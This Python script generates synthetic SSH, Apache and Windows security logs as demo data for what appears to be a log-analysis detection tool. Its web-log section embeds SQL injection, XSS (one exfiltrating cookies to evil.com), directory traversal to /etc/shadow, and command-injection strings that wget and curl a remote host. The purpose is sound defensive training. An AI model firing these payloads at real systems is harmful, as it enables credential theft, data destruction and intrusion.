"""
generate_sample_logs.py — Creates realistic demo log files in data/

Run:  python generate_sample_logs.py

Generates two files:
  data/sample_auth.log    — SSH login events (normal users + brute-force attack)
  data/sample_access.log  — Web requests (normal traffic + SQLi, XSS, scanner)

Having built-in demo data means anyone cloning the repo can immediately
try the tool without needing a real server.
"""

import random
import os
from datetime import datetime, timedelta

random.seed(42)                  # fixed seed = reproducible output
os.makedirs('data', exist_ok=True)

# ── Shared helpers ────────────────────────────────────────────────────────────

def rand_ts(base: datetime, jitter_seconds: int = 3600) -> datetime:
    """Return base + a random number of seconds up to jitter_seconds."""
    return base + timedelta(seconds=random.randint(0, jitter_seconds))

def fmt_auth(ts: datetime, host: str, msg: str) -> str:
    """Format a syslog-style auth log line."""
    return ts.strftime(f'%b %d %H:%M:%S') + f' {host} {msg}'

def fmt_web(ip: str, ts: datetime, method: str, path: str,
            status: int, size: int, agent: str) -> str:
    """Format an Apache combined-log-format line."""
    ts_str = ts.strftime('%d/%b/%Y:%H:%M:%S +0000')
    return f'{ip} - - [{ts_str}] "{method} {path} HTTP/1.1" {status} {size} "-" "{agent}"'


# ── Auth log generation ───────────────────────────────────────────────────────

def gen_auth_log(path: str):
    """
    Writes ~600 SSH auth log lines mixing:
      - Normal users (few logins, business hours, success)
      - One brute-force attacker (many rapid failures, odd hours)
      - One credential stuffer (many usernames from one IP)
    """
    lines   = []
    base_ts = datetime(2025, 1, 10, 8, 0, 0)   # 8 AM on Jan 10 2025
    host    = 'webserver01'

    # ── Normal users (3 IPs, occasional logins through the day) ──────────────
    normal_ips   = ['203.0.113.10', '203.0.113.20', '203.0.113.30']
    normal_users = ['alice', 'bob', 'carol']

    for ip, user in zip(normal_ips, normal_users):
        for _ in range(random.randint(2, 5)):
            ts = rand_ts(base_ts, 28800)   # spread over 8 hours
            lines.append((ts, fmt_auth(ts, host, f'sshd[{random.randint(1000,9999)}]: '
                f'Accepted password for {user} from {ip} port {random.randint(40000,65000)} ssh2')))
        # one failed attempt (mistyped password)
        ts = rand_ts(base_ts, 28800)
        lines.append((ts, fmt_auth(ts, host, f'sshd[{random.randint(1000,9999)}]: '
            f'Failed password for {user} from {ip} port {random.randint(40000,65000)} ssh2')))

    # ── Brute-force attacker: 150 rapid failures at 3 AM ─────────────────────
    attacker_ip = '198.51.100.99'
    attack_ts   = datetime(2025, 1, 10, 3, 0, 0)
    common_users = ['root', 'admin', 'ubuntu', 'user', 'test', 'guest', 'oracle']

    for i in range(150):
        ts   = attack_ts + timedelta(seconds=i * 2)   # one attempt every 2 seconds
        user = random.choice(common_users)
        lines.append((ts, fmt_auth(ts, host, f'sshd[{random.randint(1000,9999)}]: '
            f'Failed password for {user} from {attacker_ip} port {random.randint(40000,65000)} ssh2')))

    # ── Credential stuffer: one IP, 10 different usernames ───────────────────
    stuffer_ip    = '192.0.2.55'
    stuffer_users = ['john', 'jane', 'mike', 'sara', 'david', 'lisa', 'james', 'anna', 'tom', 'kate']
    stuff_ts      = datetime(2025, 1, 10, 2, 0, 0)

    for i, user in enumerate(stuffer_users):
        ts = stuff_ts + timedelta(minutes=i * 3)
        lines.append((ts, fmt_auth(ts, host, f'sshd[{random.randint(1000,9999)}]: '
            f'Failed password for invalid user {user} from {stuffer_ip} port {random.randint(40000,65000)} ssh2')))

    # Sort chronologically and write
    lines.sort(key=lambda x: x[0])
    with open(path, 'w') as f:
        f.write('\n'.join(line for _, line in lines) + '\n')

    print(f'[+] Wrote {len(lines)} lines -> {path}')


# ── Web log generation ────────────────────────────────────────────────────────

def gen_web_log(path: str):
    """
    Writes ~700 Apache access log lines mixing:
      - Normal web browsing traffic
      - SQL injection attempts
      - XSS attempts
      - Directory traversal
      - Automated path scanner (many 404s)
    """
    lines   = []
    base_ts = datetime(2025, 1, 10, 8, 0, 0)
    agent   = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

    # ── Normal traffic (several IPs, normal pages) ────────────────────────────
    normal_ips   = ['10.0.0.1', '10.0.0.2', '10.0.0.3', '10.0.0.4', '10.0.0.5']
    normal_paths = ['/index.html', '/about.html', '/products', '/contact',
                    '/api/users', '/api/products', '/login', '/dashboard', '/static/app.js']

    for ip in normal_ips:
        for _ in range(random.randint(20, 40)):
            ts   = rand_ts(base_ts, 28800)
            rpath = random.choice(normal_paths)
            lines.append((ts, fmt_web(ip, ts, 'GET', rpath, 200, random.randint(500, 5000), agent)))

    # ── SQL injection attacker ────────────────────────────────────────────────
    sqli_ip      = '172.16.0.99'
    sqli_payloads = [
        "/login.php?user=admin'--&pass=x",
        "/products?id=1 UNION SELECT username,password FROM users--",
        "/search?q=1' OR '1'='1",
        "/api/item?id=1; DROP TABLE users--",
        "/login?user=admin' AND 1=1--",
        "/api/data?id=1 AND sleep(5)--",
        "/page?id=' OR 1=1 LIMIT 1--",
    ]
    sqli_ts = datetime(2025, 1, 10, 1, 30, 0)
    for i in range(40):
        ts      = sqli_ts + timedelta(seconds=i * 10)
        payload = random.choice(sqli_payloads)
        lines.append((ts, fmt_web(sqli_ip, ts, 'GET', payload, 500, 0, agent)))

    # ── XSS attacker ─────────────────────────────────────────────────────────
    xss_ip       = '172.16.0.77'
    xss_payloads = [
        '/search?q=<script>alert(document.cookie)</script>',
        '/comment?text=<script>fetch("http://evil.com/steal?c="+document.cookie)</script>',
        '/name?v="><img src=x onerror=alert(1)>',
        '/page?title=<svg onload=alert(1)>',
    ]
    xss_ts = datetime(2025, 1, 10, 2, 0, 0)
    for i in range(20):
        ts      = xss_ts + timedelta(seconds=i * 15)
        payload = random.choice(xss_payloads)
        lines.append((ts, fmt_web(xss_ip, ts, 'GET', payload, 200, 300, agent)))

    # ── Directory traversal ───────────────────────────────────────────────────
    trav_ip       = '10.10.10.10'
    trav_payloads = [
        '/download?file=../../etc/passwd',
        '/view?path=../../../etc/shadow',
        '/img?src=....//....//etc/passwd',
        '/file?name=%2e%2e%2fetc%2fpasswd',
    ]
    trav_ts = datetime(2025, 1, 10, 4, 0, 0)
    for i in range(15):
        ts      = trav_ts + timedelta(seconds=i * 20)
        payload = random.choice(trav_payloads)
        lines.append((ts, fmt_web(trav_ip, ts, 'GET', payload, 403, 0, agent)))

    # ── Command injection attacker ────────────────────────────────────────────
    # Shell metacharacters followed by an actual command. Note the contrast
    # with the SQLi payloads above, which also contain semicolons: a rule that
    # fires on the punctuation alone cannot tell these apart, and will report
    # the SQLi traffic as command injection.
    cmdi_ip = '172.16.0.55'
    cmdi_payloads = [
        '/ping?host=8.8.8.8;cat /etc/passwd',
        '/tools/dns?domain=example.com|whoami',
        '/diag?target=127.0.0.1 && wget http://198.51.100.5/s.sh',
        '/exec?cmd=$(id)',
        '/report?name=`uname -a`',
        '/api/convert?file=doc.pdf;/bin/sh -c "curl http://198.51.100.5"',
    ]
    cmdi_ts = datetime(2025, 1, 10, 3, 30, 0)
    for i in range(18):
        ts      = cmdi_ts + timedelta(seconds=i * 25)
        payload = random.choice(cmdi_payloads)
        lines.append((ts, fmt_web(cmdi_ip, ts, 'GET', payload, 500, 0, agent)))

    # ── Scanner (many 404s in rapid succession) ───────────────────────────────
    scanner_ip    = '192.168.99.1'
    scanner_agent = 'Nikto/2.1.6'   # Nikto is a well-known web vulnerability scanner
    scanner_paths = [
        '/admin', '/wp-login.php', '/phpmyadmin', '/.env', '/config.php',
        '/backup.zip', '/robots.txt', '/server-status', '/shell.php',
        '/.git/config', '/api/v1/admin', '/manager/html', '/actuator',
        '/console', '/debug', '/.htaccess', '/wp-admin', '/xmlrpc.php',
    ]
    scan_ts = datetime(2025, 1, 10, 5, 0, 0)
    for i in range(60):
        ts      = scan_ts + timedelta(seconds=i)   # one request per second
        spath   = random.choice(scanner_paths)
        lines.append((ts, fmt_web(scanner_ip, ts, 'GET', spath, 404, 0, scanner_agent)))

    lines.sort(key=lambda x: x[0])
    with open(path, 'w') as f:
        f.write('\n'.join(line for _, line in lines) + '\n')

    print(f'[+] Wrote {len(lines)} lines -> {path}')


# ── Windows Security Event Log generation ─────────────────────────────────────

def _win_event(event_id: int, ts: datetime, computer: str, data: dict) -> str:
    """Format one <Event> element as wevtutil qe Security /f:xml would emit it."""
    fields = '\n'.join(
        f'    <Data Name="{k}">{v}</Data>' for k, v in data.items()
    )
    return (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        '  <System>\n'
        '    <Provider Name="Microsoft-Windows-Security-Auditing"/>\n'
        f'    <EventID>{event_id}</EventID>\n'
        f'    <TimeCreated SystemTime="{ts.strftime("%Y-%m-%dT%H:%M:%S")}.000000000Z"/>\n'
        f'    <Computer>{computer}</Computer>\n'
        '  </System>\n'
        '  <EventData>\n'
        f'{fields}\n'
        '  </EventData>\n'
        '</Event>'
    )


def gen_windows_log(path: str):
    """
    Writes a Windows Security Event Log XML export covering a full intrusion
    sequence, which is closer to what an entry-level SOC analyst actually
    triages than an SSH log:

      1. Normal morning logons from workstations           (4624)
      2. A password spray from one external host           (4625 x60)
      3. The sprayed account locks out                     (4740)
      4. The attacker succeeds on a different account      (4624)
      5. Admin rights are assigned to that account         (4672)
      6. A persistence account is created at 03:00         (4720)
    """
    entries = []
    dc = 'DC01.corp.local'

    # ── 1. Ordinary morning logons ────────────────────────────────────────────
    staff = [('jsmith', '10.0.5.21'), ('agarcia', '10.0.5.34'), ('tchen', '10.0.5.47')]
    for user, src in staff:
        for _ in range(random.randint(2, 4)):
            ts = datetime(2025, 1, 10, 8, 0, 0) + timedelta(seconds=random.randint(0, 7200))
            entries.append((ts, _win_event(4624, ts, dc, {
                'TargetUserName': user, 'IpAddress': src,
                'LogonType': 3, 'SubjectUserName': '-',
            })))

    # ── 2. Password spray: one source, many accounts, one password each ───────
    attacker = '198.51.100.77'
    sprayed = ['jsmith', 'agarcia', 'tchen', 'mwilson', 'rpatel', 'kobrien',
               'administrator', 'svc_backup', 'helpdesk', 'guest']
    spray_start = datetime(2025, 1, 10, 2, 15, 0)
    for i in range(60):
        ts = spray_start + timedelta(seconds=i * 8)
        entries.append((ts, _win_event(4625, ts, dc, {
            'TargetUserName': sprayed[i % len(sprayed)], 'IpAddress': attacker,
            'LogonType': 3, 'SubjectUserName': '-', 'Status': '0xC000006D',
        })))

    # ── 3. Lockout from the spray ─────────────────────────────────────────────
    lock_ts = spray_start + timedelta(minutes=9)
    entries.append((lock_ts, _win_event(4740, lock_ts, dc, {
        'TargetUserName': 'mwilson', 'IpAddress': '-', 'SubjectUserName': '-',
    })))

    # ── 4-5. Success, then privilege assignment on a non-admin account ────────
    breach_ts = spray_start + timedelta(minutes=12)
    entries.append((breach_ts, _win_event(4624, breach_ts, dc, {
        'TargetUserName': 'svc_backup', 'IpAddress': attacker,
        'LogonType': 10, 'SubjectUserName': '-',
    })))
    priv_ts = breach_ts + timedelta(seconds=3)
    entries.append((priv_ts, _win_event(4672, priv_ts, dc, {
        'TargetUserName': 'svc_backup', 'IpAddress': attacker, 'SubjectUserName': '-',
    })))

    # ── 6. Persistence account created at 03:00 ───────────────────────────────
    create_ts = datetime(2025, 1, 10, 3, 4, 0)
    entries.append((create_ts, _win_event(4720, create_ts, dc, {
        'TargetUserName': 'sysadmin_svc', 'IpAddress': attacker,
        'SubjectUserName': 'svc_backup',
    })))

    entries.sort(key=lambda x: x[0])
    with open(path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(entry for _, entry in entries) + '\n')

    print(f'[+] Wrote {len(entries)} Windows events -> {path}')


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == '__main__':
    gen_auth_log('data/sample_auth.log')
    gen_web_log('data/sample_access.log')
    gen_windows_log('data/sample_security.xml')
    print('\n[+] Sample logs ready. Run:')
    print('      python cli.py analyze data/sample_auth.log')
    print('      python cli.py analyze data/sample_access.log')
    print('      python cli.py analyze data/sample_security.xml')
    print('      python run_web.py   -> open http://localhost:5000')
